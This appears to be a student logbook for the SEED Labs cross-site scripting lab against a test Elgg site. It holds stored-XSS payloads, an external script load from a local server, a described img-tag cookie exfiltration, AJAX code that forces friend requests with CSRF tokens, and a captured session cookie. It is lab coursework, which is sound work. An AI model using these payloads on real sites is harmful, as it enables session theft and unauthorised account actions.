# Logbook 7 - Cross-Site Scripting (XSS) Attack Lab

## Task 1: Posting a Malicious Message to Display an Alert Window

In this task, we were asked to perform a simple XSS attack by injecting untrusted JavaScript that triggers an alert saying “hello” in Alice’s brief description. The goal was to ensure that anyone who visits http://www.seed-server.com/profile/alice (including Alice herself) would have the malicious JavaScript executed.

To do this, we went to Edit Profile → Brief Description and inserted the following payload:

```html
<script>alert("hello");</script>
```
This successfully produced the intended result.

![Logbook 7 — Task1 result](/images/logbook7/task1/task1NormalXss.png)


We also experimented with loading a longer script from our own malicious host.

Created external script (demo.js):

```javascript
alert("This is a demo to show that an external script could run in XSS, allowing us to write as many characters as we want without being limited by the Elgg website’s input fields.");
console.log("Demo external JS executed successfully.");
```

Served it via a simple HTTP server port `1337`:

```bash
python3 -m http.server 1337
```

Injected the external script by updating the brief description to:

```html
<script type="text/javascript" src="http://127.0.0.1:1337/demo.js"></script>
```

After saving the profile, the external script ran in the victim’s browser, producing the alert and console output shown below.

Here is the final result:
![Logbook 7 — Task1 Custom result](/images/logbook7/task1/task1CustomXss.png)

## Task 2: Posting a Malicious Message to Display Cookies

We followed the same idea in Task 1 but now we fetched the cookie of the user.

***Script used in alice profile:***

```html
<script>alert(document.cookie);</script>
```

Now as Boby we search for alice's profile and ...

![Logbook 7 — Task1 Custom result](/images/logbook7/task2/task2Cookies.png)

We were able to capture Boby’s cookie.

## Task 3: Stealing Cookies from the Victim’s Machine

In this task, we need to exfiltrate a user’s cookie by taking advantage of the XSS vulnerability we exploited earlier. The challenge is that modern browsers enforce strict security rules, including the **Same-Origin Policy** and **CORS**, which limit what JavaScript can do.

Because of these restrictions, our malicious JavaScript cannot simply send an arbitrary HTTP request directly to the attacker’s server. However, browsers *do* allow a webpage to load resources—such as images—from any external address without triggering CORS checks.

This is why we use an `<img>` tag with a malicious `src` attribute. When the injected JavaScript creates this image element, the browser automatically sends an **HTTP GET request** to the attacker-controlled URL in an attempt to load the image. Since the attacker controls the URL, we can append the victim’s cookie as a query parameter. The browser will include that data in the outgoing request, and the attacker’s server can capture it.


After injecting our payload, we log in as *Boby* and visit Alice’s page to trigger the XSS and observe the stolen cookies being sent to us.

![Logbook 7 — Task3 result](/images/logbook7/task3/task3Result.png)

```
Bobys cookie: Elgg%3D9fkath01b77jn9ttes9d3h5kjl
```

## Task 4: Becoming the Victim’s Friend

For Task 4, we reuse the HTTP server we created in Task 1 using Python. Our goal is now to exploit the existing XSS vulnerability to make the victim automatically send a friend request to the attacker (Samy).

We start by modifying the JavaScript provided by SEED Labs:

```javascript
window.onload = function () {
    var Ajax=null;
    
    //main variables
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var victimId = "friend=" + 59;
    var addUrl = "http://www.seed-server.com/action/friends/add";

    //Construct the HTTP request to add Samy as a friend.
    var sendurl= addUrl + "?"+victimId+ ts+ts + token+token ; 
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
```

The key change is that we insert our own user ID (Samy’s ID), which we obtain through Firefox’s console:

```javascript
elgg.session.user.guid
```

This returns our GUID, which in our setup is `59`.

We verified this by observing how the legitimate “Add Friend” request looks in the browser. When inspecting network traffic, we see something like:

```html
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1763748201&__elgg_ts=1763748201&__elgg_token=kumzi6I9itdlGholksN62w&__elgg_token=kumzi6I9itdlGholksN62w
```

here:
- ***friend*** the GUID of the user being added (Samy, ID 59)
- ***__elgg_ts*** timestamp used to validate freshness
- ***__elgg_token*** CSRF protection token associated with the victim's session

Finally, we include the correct endpoint:
```
/action/friends/add
```

### Question 1: : Explain the purpose of Lines 1 and 2, why are they are needed?

As we have seen above, the values ***__elgg_ts*** and ***__elgg_token*** are essential parts of the request. The timestamp ensures the request is fresh, and the CSRF token validates that the action is coming from an authenticated user, so both must be extracted and included correctly for the request to succeed.

### Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

No, it wouldn’t work. Proper **escaping** prevents XSS by converting dangerous characters into safe HTML entities. This means the browser treats the payload as plain text instead of HTML or JavaScript, making script execution impossible.

### Moodle Question: Há várias modalidades de ataques XSS (Reflected, Stored ou DOM). Em qual/quais pode enquadrar este ataque e porquê?

All the XSS attacks in this lab are examples of **Stored XSS**. This means our malicious code was injected into fields that are saved in the server’s database (for user example, modifying the profile description). When another loads the affected page, the application retrieves this stored data and includes the malicious JavaScript in the page, causing it to execute automatically.





